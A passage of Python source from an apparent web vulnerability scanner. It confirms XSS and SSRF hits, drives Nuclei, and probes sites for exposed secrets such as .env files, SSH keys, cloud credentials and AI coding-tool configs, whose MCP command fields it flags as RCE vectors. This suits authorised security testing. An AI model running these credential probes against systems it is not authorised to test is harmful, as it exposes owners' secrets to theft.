            import urllib.parse as _up
            _parsed = _up.urlparse(url)
            _qs = _up.parse_qs(_parsed.query)
            _qs[param] = [payload]
            _test_url = _up.urlunparse(_parsed._replace(query=_up.urlencode(_qs, doseq=True)))
            _r = _get(_test_url, timeout=8)
            if not _r:
                return {"confirmed": False, "proof": "no response on re-fetch", "confidence": 20}
            _status, _hdrs, _body = _r
            _ct = _hdrs.get("Content-Type", "")
            if payload not in _body:
                return {"confirmed": False, "proof": "payload absent from response body", "confidence": 20}
            if "text/html" not in _ct:
                return {"confirmed": False, "proof": f"non-HTML content-type: {_ct}", "confidence": 25}
            # Reject if only inside HTML comment
            _body_clean = re.sub(r'<!--.*?-->', '', _body, flags=re.DOTALL)
            if payload not in _body_clean:
                return {"confirmed": False, "proof": "payload only inside HTML comment — not exploitable", "confidence": 25}
            return {
                "confirmed": True,
                "proof": f"payload reflected in HTML body (ct={_ct.split(';')[0].strip()})",
                "confidence": 90,
                "endpoint": url, "payload": payload,
            }

        elif bug_type in ("ssrf", "ssrf_cloud", "ssrf_pdf"):
            _r = evidence.get("_response")  # already fetched by check_ssrf
            if not _r:
                import urllib.parse as _up
                _parsed = _up.urlparse(url)
                _qs = _up.parse_qs(_parsed.query)
                _qs[param] = [payload]
                _test_url = _up.urlunparse(_parsed._replace(query=_up.urlencode(_qs, doseq=True)))
                _r = _get(_test_url, timeout=10)
            if not _r:
                return {"confirmed": False, "proof": "no response", "confidence": 20}
            _status, _hdrs, _body = _r
            # Check body for internal data
            _hit = next((ind for ind in _INTERNAL_INDICATORS if ind.lower() in _body.lower()), None)
            if _hit:
                return {
                    "confirmed": True,
                    "proof": f"internal indicator '{_hit}' found in response body",
                    "confidence": 95,
                    "endpoint": url, "payload": payload,
                }
            # Check redirect to internal
            if _status in (301, 302, 303, 307, 308):
                _loc = _hdrs.get("Location", "")
                _redir_hit = next((p for p in _SSRF_REDIRECT_PREFIXES if p in _loc), None)
                if _redir_hit:
                    return {
                        "confirmed": True,
                        "proof": f"redirect to internal address: {_loc[:80]}",
                        "confidence": 88,
                        "endpoint": url, "payload": payload,
                    }
            return {"confirmed": False, "proof": "no internal indicators or redirect found", "confidence": 30}

        else:
            # Pass-through for other bug types (redirect, cors, lfi, etc.)
            # These have their own inline confirmation logic
            return {"confirmed": True, "proof": "pass-through (inline check)", "confidence": 60}

    except Exception as _ce:
        log.debug(f"[confirm] {bug_type} {url}: {_ce}")
        return {"confirmed": False, "proof": f"confirm error: {_ce}", "confidence": 20}


# ════════════════════════════════════════════════════════════════════
# NUCLEI INTEGRATION
# ════════════════════════════════════════════════════════════════════
NUCLEI_MAP = {
    "sqli":            "sqli,sql-injection,blind-sqli,error-based-sqli,time-based-sqli",
    "ssrf":            "ssrf,server-side-request-forgery",
    "lfi":             "lfi,local-file-inclusion,path-traversal,directory-traversal",
    "ssti":            "ssti,template-injection",
    "cors":            "cors,cors-misconfiguration",
    "expose":          "exposure,config,backup,sensitive-data,debug,misconfiguration,information-disclosure",
    "cve":             "cve",
    "takeover":        "takeover,subdomain-takeover",
    "xss":             "xss,cross-site-scripting,reflected-xss,stored-xss,dom-xss",
    "redirect":        "redirect,open-redirect",
    "crlf":            "crlf,header-injection",
    "panels":          "panel,login,admin,exposed-panel,default-login",
    "jsleak":          "token,secret,key-exposure,api-key,exposure",
    "smartcve":        "cve",
    "buckets":         "s3,bucket,cloud-storage,aws,azure-blob,gcp",
    "ai_deep":         "critical,high,rce,sqli,ssrf",
    "xxe":             "xxe,xml-external-entity,xml-injection",
    "oauth":           "oauth,jwt,token,auth-bypass,oidc",
    "idor":            "idor,object-reference,broken-access-control",
    "saml":            "saml",
    "deserialization": "deserialization,java-deserialization,rce,unsafe-deserialization",
    "graphql":         "graphql,graphql-injection,graphql-introspection",
    "actuator":        "springboot,actuator,spring,spring-security",
    "prototype":       "prototype-pollution,client-side,dom-based",
    "rce":             "rce,remote-code-execution,command-injection,code-injection",
    "fileupload":      "file-upload,unrestricted-file-upload,arbitrary-file-upload",
    "jwt":             "jwt,json-web-token,jwt-attack",
    "cache_poison":    "cache-poisoning,host-header,unkeyed-header",
    "mass_assign":     "mass-assignment,parameter-pollution,privilege-escalation",
    "reset_poison":    "password-reset,account-takeover,host-header-injection",
    "nosqli":          "nosqli,nosql-injection,mongodb",
    "xxss":            "xss,cross-site-scripting",
    "smuggling":       "http-smuggling,request-smuggling,desync",
    "ssti_advanced":   "ssti,template-injection,jinja2,twig,freemarker",
    "log4j":           "log4j,log4shell,cve-2021-44228,jndi",
    "spring4shell":    "spring4shell,cve-2022-22965,spring",
    "misconfig":       "misconfiguration,config,exposed-service,default-config",
    "secrets":         "secret,token,api-key,password,credential",
}

SEV={"critical":"critical","high":"high","medium":"medium","low":"low","info":"info"}

TAG2BUG=[
    ("rce",            {"rce","remote-code-execution","command-injection","code-injection"}),
    ("log4j",          {"log4j","log4shell","jndi"}),
    ("spring4shell",   {"spring4shell","cve-2022-22965"}),
    ("sqli",           {"sqli","sql-injection","blind-sqli"}),
    ("ssrf",           {"ssrf","server-side-request-forgery"}),
    ("lfi",            {"lfi","path-traversal","local-file-inclusion"}),
    ("ssti",           {"ssti","template-injection"}),
    ("cors",           {"cors"}),
    ("xss",            {"xss","cross-site-scripting"}),
    ("redirect",       {"redirect","open-redirect"}),
    ("crlf",           {"crlf","header-injection"}),
    ("takeover",       {"takeover","subdomain-takeover"}),
    ("expose",         {"exposure","config","backup","sensitive-data","debug","information-disclosure"}),
    ("jsleak",         {"token","secret","api-key","key-exposure"}),
    ("buckets",        {"s3","bucket","cloud-storage","aws","azure-blob"}),
    ("panels",         {"panel","login","admin","exposed-panel","default-login"}),
    ("xxe",            {"xxe","xml-external-entity"}),
    ("oauth",          {"oauth","jwt","auth-bypass","oidc"}),
    ("idor",           {"idor","object-reference","broken-access-control"}),
    ("saml",           {"saml"}),
    ("deserialization",{"deserialization","java-deserialization","unsafe-deserialization"}),
    ("graphql",        {"graphql"}),
    ("actuator",       {"springboot","actuator","spring"}),
    ("prototype",      {"prototype-pollution"}),
    ("fileupload",     {"file-upload","unrestricted-file-upload"}),
    ("jwt",            {"jwt","json-web-token"}),
    ("nosqli",         {"nosqli","nosql-injection"}),
    ("smuggling",      {"http-smuggling","request-smuggling","desync"}),
    ("misconfig",      {"misconfiguration","config","default-config","exposed-service"}),
    ("secrets",        {"secret","password","credential"}),
    ("cve",            {"cve"}),
]

def _t2b(tags,tid):
    ts=set(t.lower() for t in (tags or []))
    tid=(tid or "").lower()
    for bug,kws in TAG2BUG:
        if ts&kws or any(k in tid for k in kws): return bug
    return "cve"

def _parse_n(d,bug):
    info=d.get("info",{}); sev=SEV.get(info.get("severity","info"),"info")
    url=d.get("matched-at",d.get("host",""))
    ext=d.get("extracted-results",[]); curl=d.get("curl-command","")
    return {"type":bug,"bug":bug,"severity":sev,"url":url,
            "name":info.get("name",d.get("template-id","")),
            "template":d.get("template-id",""),
            "details":{
                "template":d.get("template-id",""),
                "matched":url,
                "extracted":", ".join(ext) if ext else "",
                "curl":curl[:600] if curl else "",
                "description":info.get("description",""),
                "remediation":info.get("remediation",""),
            },"ts":_ts()}

def _nuclei_bin() -> str:
    """Return nuclei binary path or empty string."""
    import shutil
    n = shutil.which("nuclei")
    if n: return n
    for d in [os.path.expanduser("~/go/bin"),"/home/kali/go/bin","/root/go/bin","/usr/local/bin"]:
        p = os.path.join(d,"nuclei")
        if os.path.isfile(p): return p
    return ""

def _nuclei(targets_file:str, bugs:List[str]) -> List[dict]:
    """
    Enhanced nuclei integration using nuclei_engine.
    Uses all 9,000+ templates, CVE coverage, auto-updates.
    """
    try:
        from engine.nuclei_engine import scan as _nscan, get_binary, update_templates
        binary = get_binary()
        if not binary:
            log.warning("[nuclei] ERROR: binary not installed — scan skipped")
            # Emit structured SSE error so UI shows real reason
            if q is not None:
                q.put({
                    "type":   "tool_status",
                    "tool":   "nuclei",
                    "status": "error",
                    "reason": "binary_not_installed",
                    "msg":    "[nuclei] ERROR: binary not installed — use /nuclei/install",
                })
            return []
        # Read targets from file
        with open(targets_file) as f:
            targets = [l.strip() for l in f if l.strip()]
        if not targets:
            return []
        # Run scan using full engine
        return _nscan(
            targets=targets,
            bugs=bugs,
            include_cves=("cve" in bugs or "smartcve" in bugs or not bugs),
            max_time=600,
        )
    except Exception as e:
        log.error(f"[nuclei] engine error: {e}")
        # Fallback to legacy implementation
        return _nuclei_legacy(targets_file, bugs)

def _nuclei_legacy(targets_file:str, bugs:List[str]) -> List[dict]:
    """Legacy nuclei fallback implementation."""
    nuclei=_which("nuclei")
    if not nuclei: log.warning("nuclei not found"); return []
    all_tags=set()
    for bug in bugs:
        for t in NUCLEI_MAP.get(bug,bug).split(","):
            all_tags.add(t.strip())
    test=subprocess.run([nuclei,"-h"],capture_output=True,text=True,env=_env())
    ht=test.stdout+test.stderr
    jflag="-jsonl" if "-jsonl" in ht else "-json"
    duc=["-duc"] if "-duc" in ht else []
    cmd=[nuclei,"-l",targets_file,"-tags",",".join(sorted(all_tags)),
         jflag,"-silent","-timeout","15","-retries","1",
         "-bulk-size","50","-concurrency","25","-rate-limit","150",
         "-no-color"]+duc
    log.info(f"[nuclei] tags: {','.join(sorted(all_tags))[:80]}...")
    findings=[]
    try:
        proc=subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,
                              text=True,env=_env(),bufsize=1)
        for line in proc.stdout:
            line=line.strip()
            if not line or not line.startswith("{"): continue
            try:
                d=json.loads(line)
                info=d.get("info",{}); tags=info.get("tags",[])
                bug=_t2b(tags,d.get("template-id",""))
                if bug in bugs or "cve" in bugs:
                    findings.append(_parse_n(d,bug))
            except: pass
        try: proc.wait(timeout=600)
        except: proc.kill()
    except Exception as e: log.error(f"nuclei: {e}")
    log.info(f"[nuclei] {len(findings)} findings")
    return findings

# ════════════════════════════════════════════════════════════════════
# VULNERABILITY CHECKS -- EVERY MAJOR CLASS
# ════════════════════════════════════════════════════════════════════

# ── 1. EXPOSURE / SENSITIVE FILES ────────────────────────────────────────────
EXPOSE_PATHS = [
    # Critical secrets
    ("/.env",              "critical", ["DB_PASSWORD","APP_KEY","SECRET","AWS_","api_key","password","DATABASE_URL"]),
    ("/.env.local",        "critical", ["PASSWORD","SECRET","KEY","TOKEN"]),
    ("/.env.production",   "critical", ["PASSWORD","SECRET","KEY"]),
    ("/.env.backup",       "critical", ["PASSWORD","SECRET"]),
    ("/config.php",        "critical", ["password","db_pass","secret"]),
    ("/wp-config.php",     "critical", ["DB_PASSWORD","AUTH_KEY","SECURE_AUTH_KEY"]),
    ("/configuration.php", "critical", ["password","secret"]),
    ("/settings.py",       "critical", ["SECRET_KEY","PASSWORD","DATABASE"]),
    ("/config.yml",        "critical", ["password","secret","key"]),
    ("/config.json",       "critical", ["password","secret","api_key","token"]),
    # Keys & certs
    ("/id_rsa",            "critical", ["BEGIN RSA","BEGIN OPENSSH","BEGIN EC"]),
    ("/.ssh/id_rsa",       "critical", ["BEGIN RSA","BEGIN OPENSSH"]),
    ("/server.key",        "critical", ["BEGIN RSA","BEGIN PRIVATE"]),
    ("/.aws/credentials",  "critical", ["aws_access_key","aws_secret"]),
    # Git & source
    ("/.git/config",       "high",     ["url = ","[remote","[branch"]),
    ("/.git/HEAD",         "high",     ["ref: refs/"]),
    ("/.gitignore",        "medium",   []),
    # Backups
    ("/backup.sql",        "critical", ["INSERT INTO","CREATE TABLE","DROP TABLE"]),
    ("/dump.sql",          "critical", ["INSERT INTO","CREATE TABLE"]),
    ("/database.sql",      "critical", ["INSERT INTO","CREATE TABLE"]),
    ("/backup.zip",        "high",     []),
    ("/backup.tar.gz",     "high",     []),
    # Debug & admin
    ("/phpinfo.php",       "high",     ["PHP Version","phpinfo()"]),
    ("/info.php",          "high",     ["PHP Version"]),
    ("/test.php",          "medium",   ["phpinfo","test"]),
    ("/adminer.php",       "critical", ["Adminer","adminer"]),
    ("/phpmyadmin/",       "high",     ["phpMyAdmin","phpmyadmin"]),
    # Spring Boot
    ("/actuator",          "high",     ["_links","actuator"]),
    ("/actuator/env",      "critical", ["activeProfiles","propertySources","password","secret"]),
    ("/actuator/heapdump", "critical", []),
    ("/actuator/trace",    "high",     ["method","path","headers"]),
    # APIs
    ("/swagger.json",      "medium",   ["swagger","openapi","paths"]),
    ("/openapi.json",      "medium",   ["openapi","paths","components"]),
    ("/api-docs",          "medium",   ["swagger","openapi"]),
    ("/graphql",           "medium",   ["__schema","__typename"]),
    # Misc
    ("/robots.txt",        "low",      ["Disallow","Allow"]),
    ("/sitemap.xml",       "low",      ["<?xml","urlset"]),
    ("/.DS_Store",         "low",      []),
    ("/crossdomain.xml",   "medium",   ["allow-access-from"]),
    # Infrastructure / DevOps exposure
    ("/docker-compose.yml",  "critical", ["services:","image:","environment:"]),
    ("/docker-compose.yaml", "critical", ["services:","image:","environment:"]),
    ("/.dockerenv",          "high",     ["docker"]),
    ("/Dockerfile",          "high",     ["FROM ","RUN ","ENV "]),
    ("/terraform.tfstate",   "critical", ['"type"','"instances"','"attributes"']),
    ("/terraform.tfvars",    "critical", ["="]),
    ("/kubernetes.yml",      "critical", ["apiVersion:","kind:","metadata:"]),
    ("/.kube/config",        "critical", ["apiVersion:","cluster","user:"]),
    # Framework admin panels
    ("/telescope",           "high",     ["Laravel Telescope"]),
    ("/telescope/requests",  "high",     ["Laravel Telescope"]),
    ("/horizon",             "high",     ["Laravel Horizon"]),
    ("/nova",                "high",     ["Nova"]),
    ("/filament",            "high",     ["Filament"]),
    ("/_profiler",           "high",     ["Symfony","profiler"]),
    ("/_wdt",                "medium",   ["Symfony","toolbar"]),
    ("/redis-commander",     "critical", ["Redis Commander"]),
    ("/kibana",              "high",     ["Kibana","elasticsearch"]),
    ("/grafana",             "high",     ["Grafana"]),
    # API docs
    ("/swagger.yaml",        "medium",   ["openapi:","swagger:","paths:"]),
    ("/openapi.yaml",        "medium",   ["openapi:","paths:"]),
    ("/api/swagger.json",    "medium",   ["swagger","paths","definitions"]),
    # Source control
    ("/.git/FETCH_HEAD",     "high",     ["branch","HEAD","refs"]),
    ("/.svn/entries",        "high",     ["dir","file","svn"]),
    # Server status
    ("/server-status",       "high",     ["Apache","requests","vhosts"]),
    ("/server-info",         "medium",   ["Apache","configuration","modules"]),
    ("/nginx_status",        "medium",   ["Active connections","requests"]),
    # Java
    ("/WEB-INF/web.xml",     "critical", ["web-app","servlet","filter"]),
    # Debug endpoints
    ("/debug/pprof",         "high",     ["goroutine","heap","profile"]),
    ("/debug/vars",          "high",     ["cmdline","memstats"]),
    # Task queues
    ("/sidekiq",             "high",     ["Sidekiq","queues","workers"]),
    ("/flower",              "high",     ["Celery","tasks","workers"]),
    # CI/CD
    ("/.github/workflows",   "medium",   ["on:","jobs:","uses:"]),
    ("/Makefile",            "medium",   ["target","PHONY",":"]),
    # Package manifests (can leak internal deps)
    ("/package.json",        "low",      ["name","version","dependencies"]),
    ("/requirements.txt",    "low",      ["flask","django","fastapi"]),
    # Security
    ("/security.txt",        "low",      ["Contact:","Expires:"]),
    # Cloud & container
    ("/.aws/credentials",       ["aws_access_key","aws_secret","AWS_"]),
    ("/.aws/config",            ["aws_access_key","region"]),
    ("/.azure/credentials",     ["clientSecret","tenantId"]),
    ("/.docker/config.json",    ["auths","registry"]),
    ("/Dockerfile",             ["FROM ","RUN ","ENV "]),
    ("/docker-compose.yml",     ["services:","image:","password"]),
    ("/k8s/",                   ["apiVersion","kind","metadata"]),
    ("/helm/",                  ["chart","values","yaml"]),
    # Config files
    ("/.env.local",             ["DB_","API_","SECRET_","PASSWORD"]),
    ("/.env.production",        ["DB_","API_","SECRET_"]),
    ("/.env.development",       ["DB_","API_","SECRET_"]),
    ("/.env.staging",           ["DB_","API_","SECRET_"]),
    ("/config.yml",             ["password","secret","api_key"]),
    ("/config.yaml",            ["password","secret","api_key"]),
    ("/config.json",            ["password","secret","apiKey"]),
    ("/settings.py",            ["SECRET_KEY","DATABASE","PASSWORD"]),
    ("/local_settings.py",      ["SECRET_KEY","DATABASE","PASSWORD"]),
    ("/database.yml",           ["password","username","adapter"]),
    ("/application.yml",        ["datasource","password","secret"]),
    ("/application.properties", ["datasource","password","secret"]),
    # Source code & secrets
    ("/wp-config.php",          ["DB_PASSWORD","DB_USER","AUTH_KEY"]),
    ("/configuration.php",      ["password","secret","db_pass"]),
    ("/config/database.php",    ["password","username","hostname"]),
    ("/.htpasswd",              [":","{SHA}","$apr1"]),
    ("/web.config",             ["connectionString","password","appSettings"]),
    # Backup files  
    ("/backup.zip",             ["PK","PK"]),
    ("/backup.sql",             ["CREATE TABLE","INSERT INTO","--"]),
    ("/db.sql",                 ["CREATE TABLE","INSERT INTO"]),
    ("/dump.sql",               ["CREATE TABLE","INSERT INTO"]),
    ("/database.sql",           ["CREATE TABLE","INSERT INTO"]),
    ("/backup.tar.gz",          [""]),
    ("/site.tar.gz",            [""]),
    ("/www.zip",                ["PK"]),
    # API & swagger
    ("/swagger.json",           ["swagger","openapi","paths"]),
    ("/swagger.yaml",           ["swagger","openapi","paths"]),
    ("/openapi.json",           ["openapi","paths","components"]),
    ("/openapi.yaml",           ["openapi","paths"]),
    ("/api-docs",               ["swagger","openapi","basePath"]),
    ("/v1/swagger.json",        ["swagger","openapi"]),
    ("/api/v1/swagger.json",    ["swagger","openapi"]),
    # Admin panels
    ("/adminer.php",            ["adminer","login","server"]),
    ("/phpMyAdmin/",            ["phpMyAdmin","MySQL"]),
    ("/phpmyadmin/",            ["phpMyAdmin","MySQL"]),
    ("/pma/",                   ["phpMyAdmin","MySQL"]),
    ("/administrator/",         ["Administrator","Joomla"]),
    ("/wp-login.php",           ["WordPress","wp-login"]),
    ("/admin/login",            ["admin","login","dashboard"]),
    ("/manage/",                ["dashboard","admin","manage"]),
    # Debug endpoints
    ("/server-status",          ["Apache","Total Accesses","CPU"]),
    ("/server-info",            ["Apache","server information"]),
    ("/status",                 ["ok","status","healthy","version"]),
    ("/metrics",                ["go_","process_","http_requests"]),
    ("/actuator/metrics",       ["names","measurements"]),
    ("/actuator/env",           ["activeProfiles","propertySources"]),
    ("/actuator/mappings",      ["dispatcherServlet","requestMappings"]),
    ("/trace",                  ["trace","info","timestamp"]),
    ("/.git/COMMIT_EDITMSG",    ["commit","merge","author"]),
    ("/.svn/entries",           ["svn","repository","committed-rev"]),
    ("/crossdomain.xml",        ["cross-domain","allow-access"]),
    ("/clientaccesspolicy.xml", ["access-policy","domain"]),
    ("/elmah.axd",              ["Error Log","ELMAH","Exception"]),
    ("/trace.axd",              ["Request Details","ASP.NET","Trace"]),

]

# ── AI Tool Attack Surface Paths (BugBunny-inspired — Gemini CLI RCE research) ──
# These paths expose AI developer tool configurations that can enable:
# - Supply chain attacks via poisoned .env / settings.json
# - MCP server hijacking (arbitrary command execution)
# - Tool discovery backdoors (code runs before UI)
# - Credential exfiltration via GEMINI_SANDBOX_PROXY_COMMAND
AI_TOOL_PATHS = [
    # Gemini CLI (CVE-2026-class: 5 RCEs found by BugBunny)
    ("/.gemini/settings.json",       "critical", ["mcpServers","toolDiscoveryCommand","SANDBOX_PROXY"]),
    ("/.gemini/.env",                "critical", ["GEMINI_","API_KEY","SECRET","TOKEN"]),
    ("/.gemini/GEMINI.md",           "medium",   ["system prompt","instructions"]),

    # Cursor AI IDE
    ("/.cursor/settings.json",       "critical", ["mcpServers","rules","api_key"]),
    ("/.cursor/rules",               "high",     ["system","prompt","instructions"]),
    ("/.cursorrules",                "high",     ["rules","instructions"]),
    ("/.cursor/.env",                "critical", ["API_KEY","SECRET","TOKEN"]),

    # Claude Code / Anthropic
    ("/.claude/settings.json",       "critical", ["mcpServers","api_key","permissions"]),
    ("/.claude/settings.local.json", "critical", ["api_key","token","secret"]),
    ("CLAUDE.md",                    "medium",   ["system","prompt","instructions","secret"]),
    ("/.claude/.env",                "critical", ["ANTHROPIC_","API_KEY","SECRET"]),

    # GitHub Copilot / VS Code
    ("/.vscode/settings.json",       "medium",   ["github.copilot","api_key","token","secret"]),
    ("/.copilot/config.json",        "high",     ["token","api_key","secret"]),

    # MCP (Model Context Protocol) servers — generic
    ("/.mcp/config.json",            "critical", ["command","mcpServers","api_key"]),
    ("/mcp.json",                    "critical", ["mcpServers","command","server"]),
    ("/.mcp.json",                   "critical", ["mcpServers","command"]),

    # Aider AI coding assistant
    ("/.aider.conf.yml",             "high",     ["api_key","openai","anthropic","model"]),
    ("/.aider/.env",                 "critical", ["API_KEY","SECRET","TOKEN"]),

    # Continue.dev
    ("/.continue/config.json",       "high",     ["apiKey","models","provider"]),

    # Codeium
    ("/.codeium/config",             "high",     ["api_key","token"]),

    # Windsurf / Codeium
    ("/.windsurf/settings.json",     "high",     ["mcpServers","api_key"]),

    # GitHub Actions secrets in CI config exposure
    ("/.github/workflows/main.yml",  "high",     ["secrets.","GITHUB_TOKEN","api_key"]),
    ("/.github/workflows/ci.yml",    "high",     ["secrets.","GITHUB_TOKEN"]),

    # Gitpod / Codespaces
    ("/.gitpod.yml",                 "medium",   ["secret","token","password","env"]),
    ("/.devcontainer/devcontainer.json","medium", ["secret","token","remoteEnv"]),

    # Terraform / IaC with AI assistants
    ("/terraform.tfvars",            "critical", ["password","secret","token","key","api"]),
    ("/.terraform/terraform.tfstate","critical", ["password","secret","token"]),

    # AI-generated config dumps (common pattern)
    ("/ai-config.json",              "high",     ["api_key","model","prompt","secret"]),
    ("/llm-config.json",             "high",     ["api_key","model","provider"]),
    ("/openai-config.json",          "critical", ["api_key","organization","secret"]),
    ("/anthropic-config.json",       "critical", ["api_key","secret"]),
]

EXPOSE_PATHS_EXTRA = [
    ("/server-status",      "high",   ["Apache Server Status","Total accesses"]),
    ("/server-info",        "medium", ["Apache Server Information"]),
    ("/.htpasswd",          "critical",["$apr1$","$2y$"]),
    ("/web.config",         "high",   ["connectionString","password","appSettings"]),
    ("/WEB-INF/web.xml",   "high",   ["servlet","web-app","param-value"]),
    ("/META-INF/MANIFEST.MF","medium",["Manifest-Version","Class-Path"]),
]

EXPOSE_PATHS = EXPOSE_PATHS + EXPOSE_PATHS_EXTRA + AI_TOOL_PATHS



def _load_expose_wordlist() -> List[tuple]:
    """Load expose paths from SecLists -- capped at 50 for speed."""
    candidates = [
        "/home/kali/Desktop/recon/SecLists/Discovery/Web-Content/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
        "/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt",
    ]
    for path in candidates:
        try:
            with open(path) as f:
                words = [l.strip() for l in f if l.strip() and not l.startswith('#')]
            # Convert to (path, sev, sigs) tuples -- cap at 50 extra paths
            extra = []
            for w in words[:50]:
                p = w if w.startswith('/') else '/' + w
                if p not in [x[0] for x in EXPOSE_PATHS]:
                    extra.append((p, "low", []))
            log.info(f"[expose] wordlist: {path} ({len(words)} paths → using {len(extra)} new)")
            return extra
        except: continue
    return []

def check_ai_tools(url: str) -> List[dict]:
    """
    Deep AI developer tool attack surface scanner.
    Inspired by BugBunny's Gemini CLI RCE research (5 CVEs).

    Detects:
    - Exposed AI tool configs (.gemini/, .cursor/, .claude/, .mcp/)
    - MCP server definitions with arbitrary command execution
    - Poisoned environment files (GEMINI_SANDBOX_PROXY_COMMAND pattern)
    - Tool discovery backdoors
    - Credential exposure in AI tool configs

    Safe detection only — no exploitation.
    """
    findings = []
    base = url.rstrip("/")

    # Deep inspection paths specific to AI tools
    ai_deep_checks = [
        # Gemini CLI — the BugBunny research targets
        ("/.gemini/settings.json", "gemini_cli_config"),
        ("/.gemini/.env",          "gemini_cli_env"),
        # Cursor
        ("/.cursor/settings.json", "cursor_config"),
        # Claude Code
        ("/.claude/settings.json", "claude_code_config"),
        ("/.claude/settings.local.json", "claude_code_config"),
        # MCP servers
        ("/mcp.json",              "mcp_server_config"),
        ("/.mcp.json",             "mcp_server_config"),
        ("/.mcp/config.json",      "mcp_server_config"),
    ]

    for path, config_type in ai_deep_checks:
        try:
            r = _get(base + path, timeout=5)
            if not r: continue
            status, hdrs, body = r
            if status != 200 or not body: continue

            body_l = body.lower()

            # Parse JSON configs for dangerous patterns
            dangerous = []
            try:
                import json as _j
                cfg = _j.loads(body)

                if config_type in ("gemini_cli_config", "cursor_config", "claude_code_config"):
                    # MCP server definitions = arbitrary command execution risk
                    mcp = cfg.get("mcpServers", cfg.get("mcp_servers", {}))
                    if mcp:
                        for server_name, server_cfg in (mcp.items() if isinstance(mcp, dict) else []):
                            cmd = server_cfg.get("command","") if isinstance(server_cfg,dict) else ""
                            if cmd:
                                dangerous.append(f"mcpServers.{server_name}.command={cmd[:50]}")

                    # Tool discovery backdoor
                    tdc = cfg.get("toolDiscoveryCommand", cfg.get("tool_discovery_command",""))
                    if tdc:
                        dangerous.append(f"toolDiscoveryCommand={str(tdc)[:60]}")

                    # Sandbox proxy (Gemini CLI RCE vector #1)
                    for key in ["GEMINI_SANDBOX_PROXY_COMMAND","sandboxProxyCommand"]:
                        if key in str(cfg):
                            dangerous.append(f"{key} present — RCE vector")

                elif config_type == "gemini_cli_env":
                    # Check for the exact RCE vector from BugBunny research
                    if "GEMINI_SANDBOX_PROXY_COMMAND" in body:
                        dangerous.append("GEMINI_SANDBOX_PROXY_COMMAND — CVE-class RCE vector (BugBunny research)")
                    for cred_key in ["API_KEY","SECRET","TOKEN","PASSWORD","AWS_ACCESS","GITHUB_TOKEN"]:
                        if cred_key in body:
                            dangerous.append(f"credential pattern: {cred_key}")

                elif config_type == "mcp_server_config":
                    # MCP server configs with command fields = RCE
                    mcp = cfg.get("mcpServers", cfg.get("servers", {}))
                    if mcp:
                        for sname, scfg in (mcp.items() if isinstance(mcp,dict) else []):
                            cmd = scfg.get("command","") if isinstance(scfg,dict) else ""
                            if cmd:
                                dangerous.append(f"MCP server '{sname}' command: {cmd[:50]}")

            except Exception:
                # Not valid JSON — check for raw secrets
                for pattern in ["GEMINI_SANDBOX_PROXY_COMMAND","mcpServers","toolDiscoveryCommand",
                                 "api_key","API_KEY","SECRET","TOKEN","BEGIN RSA","BEGIN OPENSSH"]:
                    if pattern in body:
                        dangerous.append(f"pattern detected: {pattern}")

            if dangerous:
                sev = "critical" if any("RCE" in d or "SANDBOX_PROXY" in d or "command" in d.lower()
                                         for d in dangerous) else "high"
                label = {
                    "gemini_cli_config": "Gemini CLI settings.json exposed",
                    "gemini_cli_env":    "Gemini CLI .env exposed (RCE vector)",
                    "cursor_config":     "Cursor AI settings.json exposed",
                    "claude_code_config":"Claude Code settings exposed",
                    "mcp_server_config": "MCP server config exposed (RCE risk)",
                }.get(config_type, "AI tool config exposed")

                findings.append(F("expose", sev, base+path,
                    f"{label} — {len(dangerous)} dangerous pattern(s) detected",
                    path=path,
                    config_type=config_type,
                    dangerous_patterns=dangerous[:5],
                    preview=body[:400],
                    poc=f"curl '{base+path}'",
                    impact=(
                        "Exposed AI tool configuration may enable remote code execution. "
                        "MCP server commands and toolDiscoveryCommand fields execute arbitrary "
                        "shell commands on the host. GEMINI_SANDBOX_PROXY_COMMAND is a "
                        "known RCE vector (BugBunny CVE research, Google VRP accepted)."
                        if sev == "critical" else
                        "Exposed AI tool configuration may reveal API keys, model settings, "
                        "or system prompts that could be abused."
                    ),
                    remediation=(
                        "Remove AI tool config files from web root immediately. "
                        "Add /.gemini/, /.cursor/, /.claude/, /.mcp/ to .gitignore. "
                        "Rotate any exposed API keys or tokens. "
                        "Review MCP server definitions and toolDiscoveryCommand for malicious entries."
                    ),
                    tool="ai_tools_scanner",
                    cvss=9.8 if sev=="critical" else 7.5,
                ))
                log.info(f"[ai_tools] {sev.upper()} {config_type} at {base+path}: {dangerous[:2]}")
            else:
                # Config exists but no dangerous patterns — still report as medium
                findings.append(F("expose", "medium", base+path,
                    f"AI tool config accessible: {path}",
                    path=path, config_type=config_type,
                    preview=body[:200],
                    poc=f"curl '{base+path}'",
                    impact="AI tool configuration is publicly accessible and may reveal model settings or system prompts.",
                    remediation="Restrict access to AI tool configuration files. Add to .gitignore.",
                    tool="ai_tools_scanner"))
        except Exception as e:
            log.debug(f"[ai_tools] {path}: {e}")

    # Also check for directory listing of AI config dirs
    for dir_path in ["/.gemini/", "/.cursor/", "/.claude/", "/.mcp/"]:
        try:
            r = _get(base + dir_path, timeout=3)
            if not r: continue
            status, hdrs, body = r
            if status == 200 and ("Index of" in body or "settings.json" in body or ".env" in body):
                findings.append(F("expose", "critical", base+dir_path,
                    f"AI tool directory listing exposed: {dir_path}",
                    path=dir_path,
                    impact="Directory listing of AI tool configuration exposes all config files.",
                    remediation="Disable directory listing and restrict access to AI tool directories.",
                    tool="ai_tools_scanner"))
        except Exception:
            pass

    if findings:
        log.info(f"[ai_tools] {url}: {len(findings)} AI tool findings")
    return findings


def check_expose(url:str) -> List[dict]:
    findings=[]
    base=url.rstrip("/")

    # Load wordlist paths
    wl_paths = _load_expose_wordlist()
    # Normalize all entries to 3-tuples (path, sev, sigs)
    def _norm(p):
        if len(p)==3: return p
        if len(p)==2: return (p[0], p[1], [])
        return (p[0], "medium", [])
    all_paths = [_norm(p) for p in
                 (list(EXPOSE_PATHS) + [p for p in wl_paths
                 if p[0] not in [x[0] for x in EXPOSE_PATHS]])[:80]]

    # Parallel path checking with a thread pool
    from concurrent.futures import ThreadPoolExecutor as _TPE, as_completed as _ac
    lock = threading.Lock()

    def _check_path(entry):
        path, default_sev, sigs = entry
        try:
            r = _get(base+path, timeout=3)
            if not r: return None
            status,hdrs,body=r
            if status not in (200,206,301,302,401,403): return None

            content_len = int(hdrs.get("Content-Length",0) or len(body))

            if status == 200:
                if sigs:
                    matched = [s for s in sigs if s.lower() in body.lower()]
                    if matched:
                        sev = "critical" if default_sev == "critical" else "high"
                        return F("expose", sev, base+path,
